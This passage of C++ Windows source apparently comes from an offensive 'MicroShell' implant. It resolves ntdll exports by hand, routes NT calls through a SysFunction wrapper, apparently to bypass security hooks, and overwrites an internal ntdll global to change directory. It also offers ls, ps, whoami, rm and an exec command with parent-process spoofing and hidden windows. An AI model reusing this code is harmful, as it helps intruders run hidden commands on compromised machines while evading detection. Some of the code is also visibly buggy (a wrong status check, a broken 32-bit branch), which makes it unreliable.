        LOG_W(L"    [SFEA] Successfully loaded forwarded DLL: '%hs' to 0x%p", forwardedDllName, (void*)hForwardedModule);

        LPCSTR finalProcNameToResolve;
        if(*forwardedFuncNameOrOrdinalStr == '#') // Forwarding to an ordinal, e.g., "#123"
        {
            WORD fwdOrdinal = 0;
            char* pNum = forwardedFuncNameOrOrdinalStr + 1; // Skip '#'
            while (*pNum >= '0' && *pNum <= '9')
            {
                fwdOrdinal = fwdOrdinal * 10 + (*pNum - '0');
                pNum++;
            }

            // Check if any digits were actually parsed for the ordinal
            if(pNum == (forwardedFuncNameOrOrdinalStr + 1) && fwdOrdinal == 0)  // No digits after #, or #0 was not intended
            {
                if(*(forwardedFuncNameOrOrdinalStr + 1) != '0' || *(forwardedFuncNameOrOrdinalStr + 2) != '\0')    // Allow "#0" but not "#" or "#abc"
                {
                    LOG_W(L"    [SFEA] Invalid forwarded ordinal format (no valid number after #): %hs", forwardedFuncNameOrOrdinalStr);
                    return nullptr;
                }
            }
                
            finalProcNameToResolve = (LPCSTR)(ULONG_PTR)fwdOrdinal;
            LOG_W(L"    [SFEA] Forwarding to ordinal %hu in '%hs'", fwdOrdinal, forwardedDllName);
        } 
        else // Forwarding to a name
        {
            finalProcNameToResolve = forwardedFuncNameOrOrdinalStr;
            LOG_W(L"    [SFEA] Forwarding to name '%hs' in '%hs'", finalProcNameToResolve, forwardedDllName);
        }

        return ShellcodeFindExportAddress(hForwardedModule, finalProcNameToResolve, pLoadLibraryAFunc);
    }       
    else return (void*)addr;
}



BOOLEAN static MyRtlpIsDosDeviceName_Ustr(PUNICODE_STRING PathName)
{
    if(!PathName || !PathName->Buffer || PathName->Length < 6)
        return FALSE; // Too short to be a device like CON or COM1

    // Extract the base name (strip folders if necessary, though CD usually gets clean paths)
    // For a simple CD implementation, we just check if the exact target is a device
    
    LPCWSTR name = PathName->Buffer;
    USHORT len = PathName->Length / sizeof(WCHAR);

    // Check for 3-letter devices (CON, PRN, AUX, NUL)
    if(len == 3 || (len == 4 && name[3] == L':')) 
    {
        if(_wcsnicmp(name, L"CON", 3) == 0 || _wcsnicmp(name, L"PRN", 3) == 0 || _wcsnicmp(name, L"AUX", 3) == 0 || _wcsnicmp(name, L"NUL", 3) == 0) 
        {
            return TRUE;
        }
    }
    
    // Check for 4-letter numbered devices (COM1-9, LPT1-9)
    if(len == 4 || (len == 5 && name[4] == L':'))
    {
        if((_wcsnicmp(name, L"COM", 3) == 0 || _wcsnicmp(name, L"LPT", 3) == 0) && (name[3] >= L'1' && name[3] <= L'9'))
        {
            return TRUE;
        }
    }

    return FALSE;
}

NTSTATUS static MyRtlpCreateNewDirectoryReference(PCUNICODE_STRING DosPath, USHORT MaxBufferLength, PCURDIR_REF* OutDirRef)
{

#ifdef _WIN64
    PMY_PEB pPeb = (PMY_PEB)__readgsqword(0x60);
#else
    PMY_PEB pPeb = (PMY_PEB)__readfsdword(0x30);
#endif

    NTSTATUS status;
    UNICODE_STRING ntPath = { 0 };
    OBJECT_ATTRIBUTES objAttr = { 0 };
    HANDLE fileHandle = NULL;
    IO_STATUS_BLOCK ioStatus = { 0 };
    FILE_FS_DEVICE_INFORMATION deviceInfo = { 0 };
    PCURDIR_REF dirRef = NULL;
    
    // RtlDosPathNameToNtPathName_U_WithStatus requires a null-terminated string,
    // so we create a temporary buffer from the UNICODE_STRING input.
    PWSTR tempDosPath = (PWSTR)my_RtlAllocateHeap(pPeb->ProcessHeap, 0, DosPath->Length + sizeof(WCHAR));
    if(!tempDosPath) return STATUS_NO_MEMORY;

    memcpy(tempDosPath, DosPath->Buffer, DosPath->Length);
    tempDosPath[DosPath->Length / sizeof(WCHAR)] = L'\0';


    status = my_RtlDosPathNameToNtPathName_U_WithStatus(tempDosPath, &ntPath, NULL, NULL);
    my_RtlFreeHeap(pPeb->ProcessHeap, 0, tempDosPath);
    if(!NT_SUCCESS(status))
    {
        //wprintf(L"[DIR-DEBUG] RtlDosPathNameToNtPathName failed! Status: 0x%08X\n", status);
        return status;
    }


    // Capture KUSER_SHARED_DATA value (MEMORY[0x7FFE02DC])
    ULONG v7 = SHARED_DATA_OFFSET_2DC; 

    // Open the directory
    InitializeObjectAttributes(&objAttr, &ntPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS sysstatus = (NTSTATUS)(INT_PTR)SysFunction("NtOpenFile", &fileHandle, SYNCHRONIZE | FILE_TRAVERSE, &objAttr, &ioStatus, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
    //NTSTATUS sysstatus = NtOpenFile(& fileHandle, SYNCHRONIZE | FILE_TRAVERSE, & objAttr, & ioStatus, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
    // Free the NT path buffer (Matches: RtlFreeHeap(..., *((_QWORD *)&v14 + 1)))
    my_RtlFreeHeap(pPeb->ProcessHeap, 0, ntPath.Buffer);
    if(!NT_SUCCESS(sysstatus))
    {
        //wprintf(L"[DIR-DEBUG] NtOpenFile failed! Status: 0x%08X (objAttr.Length = %lu bytes)\n", status, objAttr.Length);
        return sysstatus;
    }


    // Query Device Characteristics (Information Class 4)
    //status = my_ZwQueryVolumeInformationFile(fileHandle, &ioStatus, &deviceInfo, sizeof(deviceInfo), (FS_INFORMATION_CLASS)4);
    sysstatus = (NTSTATUS)(INT_PTR)SysFunction("ZwQueryVolumeInformationFile", fileHandle, &ioStatus, &deviceInfo, sizeof(deviceInfo), (FS_INFORMATION_CLASS)4);
    if(!NT_SUCCESS(status))
    {
        //wprintf(L"[DIR-DEBUG] ZwQueryVolumeInformationFile failed! Status: 0x%08X (sizeof deviceInfo = %llu bytes)\n", status, (unsigned long long)sizeof(deviceInfo));
        SysFunction("NtClose", fileHandle);
        return status;
    }

    // Allocate reverse-engineered structure (Header + String Size)
    dirRef = (PCURDIR_REF)my_RtlAllocateHeap(pPeb->ProcessHeap, 0, MaxBufferLength + sizeof(CURDIR_REF));
    if(!dirRef)
    {
        status = STATUS_NO_MEMORY;
        SysFunction("NtClose", fileHandle);
        return status;
    }


    memset(dirRef, 0, MaxBufferLength + sizeof(CURDIR_REF));

    // Populate the structure
    dirRef->ReferenceCount = 1;
    dirRef->Handle = fileHandle;
    
    // Fill the 8-byte PVOID gap so DosPath lands perfectly at offset 0x18
    dirRef->Unknown1 = (PVOID)(ULONG_PTR)v7; 
    
    // NTDLL reads this exactly at 0x18
    dirRef->DosPath.Length = DosPath->Length;
    dirRef->DosPath.MaximumLength = MaxBufferLength;
    dirRef->DosPath.Buffer = (PWSTR)((PUCHAR)dirRef + sizeof(CURDIR_REF));

    // Copy string into the appended buffer
    memmove(dirRef->DosPath.Buffer, DosPath->Buffer, DosPath->Length);
                
    ULONG charCount = DosPath->Length / sizeof(WCHAR);

    if(charCount > 0 && dirRef->DosPath.Buffer[charCount - 1] != L'\\')
    {
        dirRef->DosPath.Buffer[charCount] = L'\\';
        dirRef->DosPath.Buffer[charCount + 1] = L'\0';
        dirRef->DosPath.Length += sizeof(WCHAR);
    } else dirRef->DosPath.Buffer[charCount] = L'\0';

    *OutDirRef = dirRef;
    return STATUS_SUCCESS;

}

NTSTATUS static MyRtlSetCurrentDirectory_U(PUNICODE_STRING PathName)
{
    PMY_PEB Peb = (PMY_PEB)NtCurrentTeb()->ProcessEnvironmentBlock;
    PMY_RTL_USER_PROCESS_PARAMETERS ProcessParameters = Peb->ProcessParameters;
    PVOID ProcessHeap = Peb->ProcessHeap;
    
    PCURDIR_REF NewDirRef = NULL;
    NTSTATUS status;

    // Check for invalid DOS device names (like CON, PRN)
    if(MyRtlpIsDosDeviceName_Ustr(PathName)) 
        return STATUS_OBJECT_NAME_INVALID;


    WCHAR StackBuffer[MAX_PATH];
    UNICODE_STRING StaticPath;
    StaticPath.Buffer = StackBuffer;
    StaticPath.Length = 0;
    StaticPath.MaximumLength = sizeof(StackBuffer);

    UNICODE_STRING DynamicPath = { 0 };
    PUNICODE_STRING ResolvedPath = NULL;
    ULONG inputPathType = 0;

    status = my_RtlGetFullPathName_UstrEx(PathName, &StaticPath, &DynamicPath, &ResolvedPath, NULL, NULL, &inputPathType, NULL);
    if(!NT_SUCCESS(status) || ResolvedPath == NULL)
    {
        //wprintf(L"[DEBUG] RtlGetFullPathName_UstrEx failed! Status: 0x%08X\n", status);
        return status != 0 ? status : STATUS_OBJECT_NAME_INVALID;
    }

    // Strip the trailing backslash so 'cd ..' doesn't get stuck eating backslashes.
    // We only strip if the path is longer than "C:\" (3 characters).
    USHORT charLen = ResolvedPath->Length / sizeof(WCHAR);
    if (charLen > 3 && ResolvedPath->Buffer[charLen - 1] == L'\\')
    {
        ResolvedPath->Buffer[charLen - 1] = L'\0';
        ResolvedPath->Length -= sizeof(WCHAR);
    }

    //wprintf(L"[DEBUG] Resolved Path: %.*s\n", ResolvedPath->Length / sizeof(WCHAR), ResolvedPath->Buffer);

    // Create a new directory reference (This calls NtOpenFile under the hood)
    status = MyRtlpCreateNewDirectoryReference(ResolvedPath, ResolvedPath->MaximumLength, &NewDirRef);

    // Check if NtOpenFile inside RtlpCreateNewDirectoryReference succeeded
    if(!NT_SUCCESS(status))
    {
        //wprintf(L"[DEBUG] MyRtlpCreateNewDirectoryReference failed! Status: 0x%08X\n", status);
        return status;
    }

    //wprintf(L"[DEBUG] Directory Handle successfully opened. Updating PEB...\n");

    // Lock the PEB to safely update the environment
    //RtlEnterCriticalSection(&FastPebLock);
    my_RtlAcquirePebLock();

    static PVOID* actualRtlpCurDirRefAddr = NULL;

    // --- Calculate OldDirRef unconditionally BEFORE we overwrite the PEB ---
    PCURDIR_REF OldDirRef = (PCURDIR_REF)((PUCHAR)ProcessParameters->CurrentDirectory.DosPath.Buffer - 0x30);

    if(actualRtlpCurDirRefAddr == NULL)
    {
        // Scan NTDLL's .data section to find the true RtlpCurDirRef
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)sLibs_shell.hHookedNtdll;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)sLibs_shell.hHookedNtdll + dosHeader->e_lfanew);
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
            
        for(WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++)
        {
            if(memcmp(section->Name, ".data", 5) == 0)
            {
                PVOID* scanStart = (PVOID*)((PUCHAR)sLibs_shell.hHookedNtdll + section->VirtualAddress);
                SIZE_T scanSize = section->Misc.VirtualSize / sizeof(PVOID);
                    
                for(SIZE_T j = 0; j < scanSize; j++)
                {
                    if(scanStart[j] == OldDirRef)
                    {
                        actualRtlpCurDirRefAddr = &scanStart[j];
                        //wprintf(L"[DEBUG] Found and Cached RtlpCurDirRef at 0x%p\n", actualRtlpCurDirRefAddr);
                        break;
                    }
                }
                break;
            }
        }
    }

    // Update PEB ProcessParameters to point to our NewDirRef
    ProcessParameters->CurrentDirectory.Handle = NewDirRef->Handle;
    ProcessParameters->CurrentDirectory.DosPath.Buffer = NewDirRef->DosPath.Buffer;
    ProcessParameters->CurrentDirectory.DosPath.Length = NewDirRef->DosPath.Length;

    // OVERWRITE NTDLL's INTERNAL GLOBAL
    if(actualRtlpCurDirRefAddr) *actualRtlpCurDirRefAddr = NewDirRef;
    //else wprintf(L"[DEBUG] FATAL: FAILED to find RtlpCurDirRef in NTDLL memory!\n");

    my_RtlReleasePebLock();
    //wprintf(L"[DEBUG] Peb lock released\n");

    // Clean up the old directory reference
    if(OldDirRef)
    {
        if(InterlockedExchangeAdd(&OldDirRef->ReferenceCount, -1) == 1)
        {
            // If ref count hits 0, close handle and free memory
            SysFunction("NtClose", OldDirRef->Handle);
            my_RtlFreeHeap(ProcessHeap, 0, OldDirRef);
        }
    }

    if(DynamicPath.Buffer != NULL) my_RtlFreeHeap(ProcessHeap, 0, DynamicPath.Buffer);

    return STATUS_SUCCESS;
}

#pragma endregion

// --------------------------------------------------------------------------------------------

#pragma region I/O

std::wstring static GetCommand()
{
	std::wstring inputBuffer = L"";
	std::getline(std::wcin, inputBuffer);

	return inputBuffer;
}


void static send_output(std::wstring output)
{

	std::wcout << output << std::endl;
}

#pragma endregion

// --------------------------------------------------------------------------------------------

#pragma region Commands

std::wstring static InternalCommand_LS(const std::wstring& args)
{

	std::wstring searchPath = args.empty() ? L"." : args;
	std::wstring wildcard = L"*";

	// If the user provided a wildcard, we extract it
    size_t lastSlash = searchPath.find_last_of(L"\\/");
    if(lastSlash != std::wstring::npos)
	{
        // Check if there is a wildcard after the last slash
        if(searchPath.find('*', lastSlash) != std::wstring::npos || searchPath.find('?', lastSlash) != std::wstring::npos)
		{
            wildcard = searchPath.substr(lastSlash + 1);
            searchPath = searchPath.substr(0, lastSlash);
            if(searchPath.empty()) searchPath = L"\\"; // Handle root drive edge case
        }
    }
	else if(searchPath.find('*') != std::wstring::npos || searchPath.find('?') != std::wstring::npos)
	{
        // Only a wildcard was provided (e.g., L"*.txt")
        wildcard = searchPath;
        searchPath = L".";
	}

	wchar_t absPath[MAX_PATH];
	GetFullPathNameW(searchPath.c_str(), MAX_PATH, absPath, NULL);

	std::wstring ntPathStr = L"\\??\\" + std::wstring(absPath);
	std::wstring wNtPath(ntPathStr.begin(), ntPathStr.end());
	std::wstring wWildcard(wildcard.begin(), wildcard.end());

	UNICODE_STRING ntPath, searchPattern;
    RtlInitUnicodeString(&ntPath, wNtPath.c_str());
    RtlInitUnicodeString(&searchPattern, wWildcard.c_str());

	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, &ntPath, 0, NULL, NULL);
	IO_STATUS_BLOCK ioStatusBlock;
	HANDLE hDirectory = NULL;


    NTSTATUS sysstatus = (NTSTATUS)(INT_PTR)SysFunction("NtOpenFile", &hDirectory, 0x100001, &objAttr, &ioStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, 0x4021);
	if(!NT_SUCCESS(sysstatus)) return L"ls: cannot access '" + args + L"': No such file or directory\n";

	std::wstringstream output;
    output << L"\nType\tSize\t\tName\n";
    output << L"------------------------------------------------\n";


	// Query the Directory (Syscall #2)
    const ULONG bufferSize = 8192;
    PVOID buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
	if(!buffer) return L"ls: memory allocation failed\n";
    
	bool firstQuery = false;
	NTSTATUS status;

	while(true)
	{

		status = (NTSTATUS)(INT_PTR)SysFunction("NtQueryDirectoryFile", hDirectory, NULL, NULL, NULL, &ioStatusBlock, buffer, bufferSize, 3, FALSE, &searchPattern, firstQuery);
		if(status == (NTSTATUS)0xFFFFFFFF) return L"SysFunction failed\n"; 

        if((unsigned int)status == 0x80000006) break; // STATUS_NO_MORE_FILES
        if(!NT_SUCCESS(status)) break;

		if(!NT_SUCCESS(status))
		{
			HeapFree(GetProcessHeap(), 0, buffer);
			return L"ls: query failed\n";
		}

        PFILE_BOTH_DIR_INFORMATION fileInfo = reinterpret_cast<PFILE_BOTH_DIR_INFORMATION>(buffer);
        while(true)
		{
			std::wstring wFileName(fileInfo->FileName, fileInfo->FileNameLength / sizeof(wchar_t));

			if(wFileName != L"." && wFileName != L"..")
			{
				std::wstring type = (fileInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? L"[DIR]" : L"[FILE]";
				std::wstring sizeStr = (fileInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? L"<DIR>" : std::to_wstring(fileInfo->EndOfFile.QuadPart);

				output << type << L"\t" << sizeStr << L"\t\t" << wFileName << L"\n";
			}

			// Move to the next item in the raw buffer safely using byte-level pointer arithmetic
			if(fileInfo->NextEntryOffset == 0) break;
			fileInfo = reinterpret_cast<PFILE_BOTH_DIR_INFORMATION>(reinterpret_cast<PUCHAR>(fileInfo) + fileInfo->NextEntryOffset);
        }
    }

    // Cleanup
	HeapFree(GetProcessHeap(), 0, buffer);
    if(hDirectory) CloseHandle(hDirectory);

    std::wstring wResult = output.str();
    return wResult;

}

std::wstring static InternalCommand_CD(const std::wstring& args)
{

    if(args.empty()) return L"cd requires arguments.\n";

    UNICODE_STRING DestinationString;
    NTSTATUS status;

    status = my_RtlInitUnicodeStringEx(&DestinationString, args.c_str());
    if(!NT_SUCCESS(status))
    {
        wchar_t errMsg[128];
        swprintf_s(errMsg, L"Error: RtlInitUnicodeStringEx failed. NTSTATUS: 0x%08X\n", status);
        SetLastError(RtlNtStatusToDosError(status)); 
        return std::wstring(errMsg);
    }

    status = MyRtlSetCurrentDirectory_U(&DestinationString);
    if(NT_SUCCESS(status))
    {
        return L"";
    }

    wchar_t errMsg[256];
    swprintf_s(errMsg, L"Error: Failed to change directory to '%s'. NTSTATUS: 0x%08X\n", args.c_str(), status);
    
    SetLastError(RtlNtStatusToDosError(status));
    return std::wstring(errMsg);
}

std::wstring static InternalCommand_WHOAMI(const std::wstring& args)
{
	HANDLE hToken = NULL;
	
	// Open the access token associated with the current process
	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return L"Error: Failed to open process token.\n";

	// To get the required buffer size
	// This will intentionally fail with ERROR_INSUFFICIENT_BUFFER, but populate dwSize
	DWORD dwSize = 0;
	GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);

	// Allocate a dynamic buffer based on the size requested by the OS
	std::vector<BYTE> tokenBuffer(dwSize);
	PTOKEN_USER pTokenUser = (PTOKEN_USER)tokenBuffer.data();

	// Call GetTokenInformation again, this time with the properly sized buffer
	if(!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
	{
		CloseHandle(hToken);
		return L"Error: Failed to extract TokenUser information.\n";
	}

	// We now have the SID. We need to translate it to Domain\User
	wchar_t userName[256];
	DWORD userNameSize = ARRAYSIZE(userName);
	
	wchar_t domainName[256];
	DWORD domainNameSize = ARRAYSIZE(domainName);
	
	SID_NAME_USE sidType;

	// LookupAccountSidA contacts the local SAM database or Domain Controller to resolve the SID
	if(!LookupAccountSidW(NULL, pTokenUser->User.Sid, userName, &userNameSize, domainName, &domainNameSize, &sidType))
	{
		CloseHandle(hToken);
		return L"Error: Failed to resolve SID to account name.\n";
	}

	CloseHandle(hToken);
	return std::wstring(domainName) + L"\\" + std::wstring(userName) + L"\n";
}

std::wstring static InternalCommand_PS(const std::wstring& args)
{

	std::wstringstream output;

	ULONG bufferSize = 1024 * 1024; 
	PVOID buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if(buffer == NULL)
	{
		return L"Error: Initial VirtualAlloc failed.\n";
	}

	NTSTATUS status;
	while(true)
	{
		status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
		
		if(status == 0xC0000004)
		{
			VirtualFree(buffer, 0, MEM_RELEASE);
			bufferSize += (1024 * 1024); // Add another 1MB and try again
			buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if(buffer == NULL)
			{
				return L"Error: Reallocation VirtualAlloc failed.\n";
			}
		}

		else break;
	}

	if(!NT_SUCCESS(status))
	{
		output << L"Error: NtQuerySystemInformation failed with status L" << std::hex << status << L"\n";

		if(buffer != NULL) VirtualFree(buffer, 0, MEM_RELEASE);
		return output.str();
	}


	PMY_SYSTEM_PROCESS_INFORMATION pInfo = (PMY_SYSTEM_PROCESS_INFORMATION)buffer;
		
	output << L"PID\tPPID\tName\n";
	output << L"----------------------------------------\n";

	while(true)
	{
		DWORD pid = (DWORD)(ULONG_PTR)pInfo->UniqueProcessId;
		DWORD ppid = (DWORD)(ULONG_PTR)pInfo->InheritedFromUniqueProcessId;
			
		std::wstring procName = L"[System or Unknown]";
		
		if(pInfo->ImageName.Buffer != NULL) procName = std::wstring(pInfo->ImageName.Buffer, pInfo->ImageName.Length / sizeof(wchar_t));

		output << pid << L"\t" << ppid << L"\t" << procName << L"\n";

		if(pInfo->NextEntryOffset == 0) break;
			
		pInfo = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pInfo + pInfo->NextEntryOffset);
	}


	VirtualFree(buffer, 0, MEM_RELEASE);
	return output.str();

}

std::wstring static InternalCommand_MKDIR(const std::wstring& args)
{
	if(args.empty()) return L"Error: mkdir requires a directory name.\n";

	if(CreateDirectoryW(args.c_str(), nullptr)) return L"Directory created: " + args + L"\n";
	
	return L"Error: Failed to create directory. Code: L" + std::to_wstring(GetLastError()) + L"\n";
}

std::wstring static InternalCommand_RM(const std::wstring& args)
{
	if(args.empty()) return L"Error: rm requires a file name.\n";

	if(DeleteFileW(args.c_str())) return L"File deleted: " + args + L"\n";
	
	return L"Error: Failed to delete file. Code: " + std::to_wstring(GetLastError()) + L"\n";
}

std::wstring static InternalCommand_EXEC(const std::wstring& args)
{
	if(args.empty()) return L"Error: exec requires a target executable.\n";

	std::wstring command = args;
	DWORD targetPid = 0;

	// Parse arguments to see if a PID was provided at the end
	size_t lastSpace = args.find_last_of(' ');
	if(lastSpace != std::wstring::npos)
	{
		std::wstring possiblePid = args.substr(lastSpace + 1);
		bool isNumeric = true;
		
		// Verify every wchar_tacter in the last token is a digit
		for(wchar_t c : possiblePid)
		{
			if(!isdigit(c))
			{
				isNumeric = false;
				break;
			}
		}

		if(isNumeric && !possiblePid.empty())
		{
			targetPid = std::stoul(possiblePid);
			command = args.substr(0, lastSpace);
			
			// Clean up any trailing whitespace from the command string
			command.erase(command.find_last_not_of(L" \n\r\t") + 1);
		}
	}

	// Safely copy the command string into a writable buffer for the Windows API
	std::vector<wchar_t> cmdline(command.begin(), command.end());
	cmdline.push_back('\0');

	if(targetPid == 0)
	{
		// --- NORMAL CREATION ---
		STARTUPINFOW si;
		PROCESS_INFORMATION pi;
		
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		if(CreateProcessW(NULL, cmdline.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
		{
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			return L"[+] Process started normally: '" + command + L"'\n";
		}
		else return L"[-] Error: Normal execution failed. Code: " + std::to_wstring(GetLastError()) + L"\n";
	}
	else
	{
		// --- SPOOFED CREATION (PID provided) ---
		HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPid);
		if(hParent == NULL) return L"[-] Error: Failed to open Parent PID " + std::to_wstring(targetPid) + L". Code: " + std::to_wstring(GetLastError()) + L"\n";

		SIZE_T attributeSize = 0;
		InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);

		PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
		if(pAttributeList == NULL)
		{
			CloseHandle(hParent);
			return L"[-] Error: Failed to allocate Attribute List.\n";
		}

		if(!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &attributeSize))
		{
			HeapFree(GetProcessHeap(), 0, pAttributeList);
			CloseHandle(hParent);
			return L"[-] Error: Failed to initialize Attribute List.\n";
		}

		if(!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL))
		{
			DeleteProcThreadAttributeList(pAttributeList);
			HeapFree(GetProcessHeap(), 0, pAttributeList);
			CloseHandle(hParent);
			return L"[-] Error: Failed to update Attribute List.\n";
		}

		STARTUPINFOEXW siex;
		PROCESS_INFORMATION pi;
		
		ZeroMemory(&siex, sizeof(siex));
		siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
		siex.lpAttributeList = pAttributeList;
		ZeroMemory(&pi, sizeof(pi));

		BOOL success = CreateProcessW(NULL, cmdline.data(), NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &siex.StartupInfo, &pi);

		DeleteProcThreadAttributeList(pAttributeList);
		HeapFree(GetProcessHeap(), 0, pAttributeList);
		CloseHandle(hParent);

		if(success)
		{
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			return L"[+] Process spoofed successfully: '" + command + L"' as child of PID " + std::to_wstring(targetPid) + L"\n";
		}
		else return L"[-] Error: Spoofed execution failed. Code: " + std::to_wstring(GetLastError()) + L"\n";
	}
}

std::wstring static InternalCommand_RMDIR(const std::wstring& args)
{
	if(args.empty()) return L"Error: rmdir requires a directory name.\n";

	if(RemoveDirectoryW(args.c_str())) return L"Directory removed: " + args + L"\n";
	
	return L"Error: Failed to remove directory. Code: L" + std::to_wstring(GetLastError()) + L"\n";
}

#pragma endregion

// --------------------------------------------------------------------------------------------

static std::wstring Custom_GetCurrentDirectoryW()
{
	#ifdef _WIN64
		PMY_PEB pPeb = (PMY_PEB)__readgsqword(0x60);
	#else
		PPEB _MY_PPEB = (_MY_PPEB)__readfsdword(0x30);
	#endif

    if(pPeb && pPeb->ProcessParameters)
    {
        PWSTR buffer = pPeb->ProcessParameters->CurrentDirectory.DosPath.Buffer;
        USHORT length = pPeb->ProcessParameters->CurrentDirectory.DosPath.Length;

        if(buffer && length > 0) return std::wstring(buffer, length / sizeof(WCHAR));
    }

    return std::wstring();
}

static NTSTATUS GetLibs()
{
    
#ifdef _M_IX86
    PEB* pPEB = (PEB*) __readfsdword(0x30);
#else
    PEB* pPEB = (PEB*) __readgsqword(0x60);   
#endif


    static const WCHAR kNtdll[] = L"ntdll.dll";
    static const WCHAR hKernelbase[] = L"kernelbase.dll";

    MY_PEB_LDR_DATA* pLdr = (MY_PEB_LDR_DATA*)pPEB->Ldr;
    auto head = &pLdr->InLoadOrderModuleList;
    auto current = head->Flink;    // first entry is the EXE itself


    while(current != head)
    {
        auto entry = CONTAINING_RECORD(current, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if(entry->BaseDllName.Buffer)
        {
            const WCHAR* namePtr;
            SIZE_T nameLen;

            HelperSplitFilename(entry->BaseDllName.Buffer, entry->BaseDllName.Length / sizeof(WCHAR), &namePtr, &nameLen);

            SIZE_T kbselen = sizeof(hKernelbase)/sizeof(WCHAR) - 1;
            if(nameLen == kbselen && isSameW(namePtr, hKernelbase, kbselen)) sLibs_shell.hKERNELBASE = (HMODULE)entry->DllBase;

            SIZE_T ntlen = sizeof(kNtdll)/sizeof(WCHAR) - 1;
            if(nameLen == ntlen && isSameW(namePtr, kNtdll, ntlen)) sLibs_shell.hHookedNtdll = (HMODULE)entry->DllBase;


        } current = current->Flink;

    } 

    if(sLibs_shell.hHookedNtdll == NULL) 
    {
        LOG_W(L"Could not get ntdll.dll \n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    if(sLibs_shell.hKERNELBASE == NULL) 
    {
        LOG_W(L"Could not get KERNELBASE \n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    return STATUS_SUCCESS;

}

static NTSTATUS ResolveFunctions()
{
    const CHAR cRtlInitUnicodeStringEx[] = "RtlInitUnicodeStringEx";
    const CHAR cRtlAllocateHeap[] = "RtlAllocateHeap";
    const CHAR cRtlFreeHeap[] = "RtlFreeHeap";
    const CHAR cRtlCopyUnicodeString[] = "RtlCopyUnicodeString";
    const CHAR cRtlAcquirePebLock[] = "RtlAcquirePebLock";
    const CHAR cRtlReleasePebLock[] = "RtlReleasePebLock";
    const CHAR cRtlGetFullPathName_UstrEx[] = "RtlGetFullPathName_UstrEx";
    const CHAR cRtlDosPathNameToNtPathName_U_WithStatus[] = "RtlDosPathNameToNtPathName_U_WithStatus";


    my_RtlInitUnicodeStringEx = (pfnRtlInitUnicodeStringEx)ShellcodeFindExportAddress(sLibs_shell.hHookedNtdll, cRtlInitUnicodeStringEx, my_LoadLibraryA);
    if(my_RtlInitUnicodeStringEx == NULL) __debugbreak();

    my_RtlAllocateHeap = (pfnRtlAllocateHeap)ShellcodeFindExportAddress(sLibs_shell.hHookedNtdll, cRtlAllocateHeap, my_LoadLibraryA);
    if(my_RtlAllocateHeap == NULL) __debugbreak();

    my_RtlFreeHeap = (pfnRtlFreeHeap)ShellcodeFindExportAddress(sLibs_shell.hHookedNtdll, cRtlFreeHeap, my_LoadLibraryA);
    if(my_RtlFreeHeap == NULL) __debugbreak();

    my_RtlCopyUnicodeString = (pfnRtlCopyUnicodeString)ShellcodeFindExportAddress(sLibs_shell.hHookedNtdll, cRtlCopyUnicodeString, my_LoadLibraryA);
    if(my_RtlCopyUnicodeString == NULL) __debugbreak();

    my_RtlAcquirePebLock = (pfnRtlAcquirePebLock)ShellcodeFindExportAddress(sLibs_shell.hHookedNtdll, cRtlAcquirePebLock, my_LoadLibraryA);
    if(my_RtlAcquirePebLock == NULL) __debugbreak();

    my_RtlReleasePebLock = (pfnRtlReleasePebLock)ShellcodeFindExportAddress(sLibs_shell.hHookedNtdll, cRtlReleasePebLock, my_LoadLibraryA);
    if(my_RtlReleasePebLock == NULL) __debugbreak();

    my_RtlGetFullPathName_UstrEx = (pfnRtlGetFullPathName_UstrEx)ShellcodeFindExportAddress(sLibs_shell.hHookedNtdll, cRtlGetFullPathName_UstrEx, my_LoadLibraryA);
    if(my_RtlGetFullPathName_UstrEx == NULL) __debugbreak();

    my_RtlDosPathNameToNtPathName_U_WithStatus = (pfnRtlDosPathNameToNtPathName_U_WithStatus)ShellcodeFindExportAddress(sLibs_shell.hHookedNtdll, cRtlDosPathNameToNtPathName_U_WithStatus, my_LoadLibraryA);
    if(my_RtlDosPathNameToNtPathName_U_WithStatus == NULL) __debugbreak();


    return STATUS_SUCCESS;
}

int static InitializeMicroShell()
{

